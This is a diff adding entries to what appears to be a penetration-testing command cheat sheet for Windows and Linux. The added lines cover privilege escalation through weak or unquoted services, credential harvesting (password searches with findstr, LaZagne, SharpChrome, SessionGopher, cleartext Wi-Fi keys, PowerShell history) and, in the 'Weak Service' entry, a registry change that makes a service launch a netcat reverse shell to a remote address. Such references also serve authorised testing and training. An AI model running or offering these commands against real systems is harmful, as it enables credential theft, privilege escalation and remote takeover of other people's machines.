@@ -240,6 +240,10 @@ C:\> wmic group list /format:list
 C:\> wmic sysaccount list /format:list
 C:\> wmic product get name
 C:\> tasklist /svc
+PS C:\> Get-Process
+PS C:\> Get-Process -Id <PID>
+PS C:\> Get-Service
+PS C:\> Get-Service | ? {$_.DisplayName -like '<service>*'}
 C:\> cmd /c echo %PATH%
 https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4
 C:\> dsquery user
@@ -1860,6 +1864,19 @@ $ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 $ find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null
 ```
 
+- Unquoted Service Paths
+
+```
+C:\> wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+```
+
+- Weak Service
+
+```
+C:\> accesschk.exe /accepteula "<username>" -kvuqsw hklm\System\CurrentControlSet\services
+C:\> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\<username>\Downloads\nc.exe -e cmd.exe <IP address> <port>"
+```
+
 - PATH Variable
 
 ```
@@ -1958,6 +1975,13 @@ https://github.com/GhostPack/Seatbelt
 
 ```
 https://github.com/411Hall/JAWS
+```
+
+- SharpUp
+
+```
+https://github.com/ghostpack/sharpup
+C:\> .\SharpUp.exe audit
 ```
 
 - Weak Service
@@ -2226,6 +2250,7 @@ $ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 C:\> dir /q <file>
 C:\> takeown /f <file>
 PS C:\> Get-ChildItem -Path '<file>' | select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}
+C:\> icacls "<file"
 C:\> icacls "<file>" /grant <username>:F
 ```
 
@@ -2320,12 +2345,18 @@ $ lscpu
 $ cat /etc/shells
 ```
 
-- Exposed Credentials
+- Bash History
 
 ```
 $ history
 $ cat .bash_history
+```
+
+- PowerShell History
+
+```
 PS C:\> Get-Content (Get-PSReadlineOption).HistorySavePath
+PS C:\> gc (Get-PSReadLineOption).HistorySavePath
 ```
 
 - SSH Key Login
@@ -2403,6 +2434,8 @@ C:\> sc stop <service>
 C:\> sc start <service>
 C:\> PsService.exe security AppReadiness
 C:\> sc config AppReadiness binPath= "cmd /c net localgroup Administrators <username> /add"
+C:\> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+PS C:\> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
 ```
 
 - Registry
@@ -2756,6 +2789,7 @@ C:\> dir n:\*password* /s /b
 C:\> dir n:\*users* /s /b
 C:\> dir n:\*secret* /s /b
 C:\> dir n:\*key* /s /b
+C:\> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 ```
 
 - Find
@@ -2769,6 +2803,15 @@ $ find <directory> -name *cred*
 ```
 C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 C:\> findstr /s /i cred n:\*.*
+C:\> findstr /si password *.xml *.ini *.txt *.config
+C:\> findstr /spin "password" *.*
+```
+
+- Where
+
+```
+C:\> where /R C:\ *.config
+PS C:\> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
 ```
 
 - Grep
@@ -2792,6 +2835,7 @@ PS C:\> Get-ChildItem -Recurse -Path N:\ -Include *key* -File
 
 ```
 PS C:\> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
+PS C:\> Select-String -Path C:\Users\<username>\Documents\*.txt -Pattern password
 ```
 
 - Rundll32
@@ -2929,8 +2973,23 @@ $ bash mimipenguin.sh
 
 ```
 $ python2.7 lazagne.py all
+C:\> .\lazagne.exe all
 $ python3 lazagne.py browsers
 C:\> start LaZagne.exe all
+```
+
+- SessionGopher
+
+```
+https://github.com/Arvanaghi/SessionGopher
+PS C:\> Invoke-SessionGopher -Target <hostname>
+```
+
+- Wireless Networks
+
+```
+C:\> netsh wlan show profile
+C:\> netsh wlan show profile ilfreight_corp key=clear
 ```
 
 - Filezilla Credentials
@@ -2944,6 +3003,19 @@ $ cat /home/<user>/.filezilla/filezilla.xml
 ```
 $ ls -l /home/<user>/.mozilla/firefox/ | grep default
 $ cat /home/<user>/.mozilla/firefox/1bplpd86.default-release/logins.json | jq .
+```
+
+- Chrome Credentials
+
+```
+PS C:\> gc 'C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
+```
+
+- SharpChrome
+
+```
+https://github.com/GhostPack/SharpDPAPI
+C:\> .\SharpChrome.exe logins /unprotect
 ```
 
 - Firefox_decrypt
@@ -3024,6 +3096,19 @@ $ sudo cat /etc/security/opasswd
 
 ```
 $ cat .bash_history
+```
+
+- PowerShell History
+
+```
+PS C:\> (Get-PSReadLineOption).HistorySavePath
+PS C:\> gc (Get-PSReadLineOption).HistorySavePath
+```
+
+- Decrypt PowerShell Credentials
+
+```
+PS C:\> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
 ```
 
 - Bashrc
